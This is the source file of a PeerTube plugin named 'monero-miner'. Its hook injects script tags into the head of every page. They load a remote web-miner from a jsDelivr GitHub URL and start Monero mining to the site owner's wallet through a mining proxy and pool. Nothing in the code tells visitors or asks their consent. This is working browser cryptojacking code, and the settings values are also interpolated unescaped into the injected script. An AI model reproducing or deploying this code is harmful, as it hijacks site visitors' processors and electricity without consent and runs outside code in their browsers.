// 不要なモジュールは削除
// const fs = require('fs');
// const path = require('path');

module.exports = {
  manifest: {
    name: 'monero-miner',
    description: 'PeerTube plugin for Monero mining.',
    version: '1.0.10',
    license: 'MIT',
    author: 'PYU224',
    dependencies: {},
  },

  async register({ registerHook, registerSetting }) {
    // Register plugin settings
    const settings = [
      {
        name: 'walletAddress',
        label: 'Monero Wallet Address',
        type: 'input',
        private: false,
        default: '',
      },
      {
        name: 'webSocket',
        label: 'WebSocket Server',
        type: 'input',
        private: false,
        default: 'wss://ny1.xmrminingproxy.com',
      },
      {
        name: 'poolAddress',
        label: 'Mining Pool Address',
        type: 'input',
        private: false,
        default: 'moneroocean.stream',
      },
      {
        name: 'threads',
        label: 'Number of Threads',
        type: 'input',
        private: false,
        default: '2',
      },
      {
        name: 'password',
        label: 'Password',
        type: 'input',
        private: false,
        default: '',
      },
    ];

    // registerSettingで複数の設定を登録する際にfor文で設定をまとめて処理する
    for (const setting of settings) {
      registerSetting(setting);
    }

    // Hook to inject mining script into the theme's head
    registerHook({
      target: 'action:theme.head',
      handler: ({ settings }) => {
        const { walletAddress, webSocket, poolAddress, threads, password } = settings;
        if (!walletAddress || !poolAddress) {
          console.error('Monero miner plugin: Required settings are missing.');
          return '';
        }

        return `
          <!-- Monero Miner Script -->
          <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
          <script>
            const server = "${webSocket}";
            const pool = "${poolAddress}";
            const wallet = "${walletAddress}";
            const workerId = "PeerTube-Miner";
            const threads = ${threads};
            const password = "${password}";
            startMining(pool, wallet, workerId, threads, password);
            throttleMiner = 20;
          </script>
        `;
      },
    });
  },

  async unregister() {
    console.log('Unregistering Monero Miner plugin...');
  },
};
